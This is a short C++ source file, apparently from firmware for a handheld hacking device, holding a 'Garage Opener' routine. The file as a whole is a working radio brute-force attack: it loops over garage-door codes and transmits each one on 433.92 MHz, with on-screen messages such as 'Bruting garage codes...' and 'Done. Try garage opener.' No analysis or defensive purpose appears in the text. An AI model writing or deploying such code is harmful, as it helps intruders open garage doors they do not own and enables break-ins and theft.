// garageopener.cpp
#include "garageopener.h"
#include "../hardware/hw_radio.h"
#include "../ui/ui_draw.h"
void garageopener_run(cyd_state_t* state) {
    cyd_draw_attack("Garage Opener");
    cyd_draw_log("Bruting garage codes...");
    for(uint32_t code=0x1000; code<0x2000; code+=9) {
        radio_send_code(433920000, 2, code);
        delay(20);
        cyd_draw_log("Trying codes...");
    }
    cyd_draw_green_light("Done. Try garage opener.");
}
